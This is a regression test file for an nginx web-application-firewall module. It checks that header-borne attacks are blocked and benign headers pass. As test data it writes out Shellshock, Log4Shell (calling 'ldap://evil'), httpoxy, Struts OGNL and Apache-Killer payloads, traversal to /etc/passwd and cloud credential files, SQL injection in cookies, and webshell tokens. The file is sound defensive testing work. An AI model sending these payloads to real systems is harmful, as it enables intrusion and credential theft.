# Header-borne attacks and the two structural checks.
use Test::Nginx::Socket 'no_plan';

repeat_each(1);
no_long_string();
run_tests();

__DATA__

=== TEST 1: Shellshock in User-Agent
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
User-Agent: () { :;}; /bin/bash -c id
--- error_code: 403

=== TEST 2: Log4Shell in User-Agent
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
User-Agent: ${jndi:ldap://evil/a}
--- error_code: 403

=== TEST 3: httpoxy Proxy header
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Proxy: http://attacker:8080
--- error_code: 403

=== TEST 4: Struts OGNL in Content-Type (CVE-2017-5638)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Content-Type: %{(#nike='multipart/form-data')}
--- error_code: 403

=== TEST 5: Apache-Killer Range header
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Range: bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7,7-8,8-9,9-10,10-11,11-12
--- error_code: 403

=== TEST 6: a normal Range header is allowed
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Range: bytes=0-1023
--- error_code: 200

=== TEST 7: a normal User-Agent is allowed
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0
--- error_code: 200

=== TEST 8: httpoxy check can be skipped
--- config
    location /t { shield block; shield_skip httpoxy; empty_gif; }
--- request
GET /t
--- more_headers
Proxy: http://attacker:8080
--- error_code: 200

=== TEST 9: an encoded control byte in the path is blocked
# nginx rejects a RAW control byte in the request line with 400, so only the
# percent-encoded form reaches a phase handler -- and it arrives decoded, as a
# real control byte, in r->uri. No legitimate client sends one.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t%01x
--- error_code: 403

=== TEST 10: the control-byte check reports the ctrl_char category
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t%01x
--- error_log
category=ctrl_char
--- error_code: 403

=== TEST 11: an ESC byte in the path is blocked too
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t%1bx
--- error_code: 403

=== TEST 12: the control-byte check can be skipped
--- config
    location /t { shield block; shield_skip ctrl_char; empty_gif; }
--- request
GET /t%01x
--- error_code: 200

=== TEST 13: NUL in the QUERY STRING stays with the nullbyte category
# ctrl_char deliberately does not take over the bytes that already have a more
# precise category -- an operator who skipped nullbyte must keep that choice.
# (An encoded NUL in the PATH never gets here: nginx 400s it in the parser.
# The query string is not decoded by nginx, so it reaches the signature scan.)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=%00
--- error_log
category=nullbyte
--- error_code: 403

=== TEST 14: Log4Shell in an arbitrary application header
# Every header value gets template + shellshock coverage because applications
# routinely log or CGI-export headers they do not understand.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
X-Api-Version: ${jndi:ldap://evil/a}
--- error_log
category=template source=header
--- error_code: 403

=== TEST 15: Shellshock in an arbitrary CGI-exported header
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
X-Debug: () { :;}; /bin/bash -c id
--- error_code: 403

=== TEST 16: WebDAV Destination traversal gets the full ruleset
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Destination: http://backend.example/a/../../etc/passwd
--- error_log
category=traversal source=header
--- error_code: 403

=== TEST 17: reverse-proxy URI override gets the full ruleset
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
X-Original-URL: /.config/gcloud/application_default_credentials.json
--- error_code: 403

=== TEST 18: SQL injection in a Cookie value
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Cookie: session=ok; preference=1 union select password from users
--- error_code: 403

=== TEST 19: opaque Cookie values do not run short-token categories
# ro0ab is Java stream magic and p0wny is a webshell name. Both are only five
# bytes, so running those categories over random session IDs would eventually
# false-positive at scale.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Cookie: session=rO0ABp0wny
--- error_code: 200

=== TEST 20: opaque Authorization values only get punctuation-rich checks
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Authorization: Bearer rO0ABp0wny
--- error_code: 200

=== TEST 21: shield_skip applies to generic-header coverage
--- config
    location /t { shield block; shield_skip template; empty_gif; }
--- request
GET /t
--- more_headers
X-Api-Version: ${jndi:ldap://evil/a}
--- error_code: 200

=== TEST 22: random multipart Content-Type boundaries avoid short-token categories
# Content-Type must retain Struts coverage (TEST 4) without interpreting an
# opaque boundary as Java stream magic or a webshell name.
--- config
    location /t { shield block; empty_gif; }
--- request
POST /t
--- more_headers
Content-Type: multipart/form-data; boundary=rO0ABp0wny
--- error_code: 405

=== TEST 23: generic header class -- shellshock MUST fire (in generic_allowed)
# Start of the per-header-class category matrix (TEST 23-34).
#
# header_skip = slcf->skip | ~allowed in ngx_http_shield_inspect_prebody()
# gives each header class its own category allow-list. The differential
# fuzzer cannot reach this: it fuzzes the mask bits directly, so a category
# wrongly added to (or missing from) a class's `allowed` constant is not
# expressible as an oracle divergence. These tests PIN the allow-list
# constants at src/ngx_http_shield_module.c:500-576 by asserting, per class,
# one category that MUST fire and one that must NOT.
#
# webshell ("b374k") is the MUST-NOT probe for generic/content-type/cookie:
# it is a short, punctuation-free token not in any of their allow-lists, so
# a wrongly-widened mask would light it up. It IS in the full ruleset, so it
# doubles as the MUST-fire probe for URI-bearing / UA / Referer headers.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
X-Custom-Debug: () { :;}; /bin/bash -c id
--- error_log
category=shellshock source=header
--- error_code: 403

=== TEST 24: generic header class -- webshell token MUST NOT fire (not in generic_allowed)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
X-Custom-Debug: b374k
--- error_code: 200

=== TEST 25: content-type class -- java_rce MUST fire (added on top of generic)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Content-Type: %{(#nike='multipart/form-data')}
--- error_log
category=java_rce source=content-type
--- error_code: 403

=== TEST 26: content-type class -- webshell token MUST NOT fire (not added for content-type)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Content-Type: b374k/form-data
--- error_code: 200

=== TEST 27: content-type class -- traversal MUST NOT fire (not in content-type allow-list)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Content-Type: multipart/form-data; boundary=../../etc/passwd
--- error_code: 200

=== TEST 28: cookie class -- sqli MUST fire (one of the 12 injection-shaped categories)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Cookie: session=ok; q=union select password from users
--- error_log
category=sqli source=header
--- error_code: 403

=== TEST 29: cookie class -- webshell token MUST NOT fire (not one of the 12 cookie categories)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Cookie: session=b374k
--- error_code: 200

=== TEST 30: cookie class -- traversal MUST NOT fire (not in the cookie allow-list)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Cookie: session=../../etc/passwd
--- error_code: 200

=== TEST 31: URI-bearing header (X-Rewrite-URL) gets the full ruleset -- webshell fires
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
X-Rewrite-URL: /uploads/b374k
--- error_log
category=webshell source=header
--- error_code: 403

=== TEST 32: URI-bearing header (X-Rewrite-URL) full ruleset -- traversal also fires
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
X-Rewrite-URL: /a/../../etc/passwd
--- error_code: 403

=== TEST 33: User-Agent gets the full ruleset -- webshell token fires (not just generic)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
User-Agent: b374k
--- error_log
category=webshell source=user-agent
--- error_code: 403

=== TEST 34: Referer gets the full ruleset -- webshell token fires (not just generic)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Referer: http://example.com/b374k
--- error_log
category=webshell source=referer
--- error_code: 403
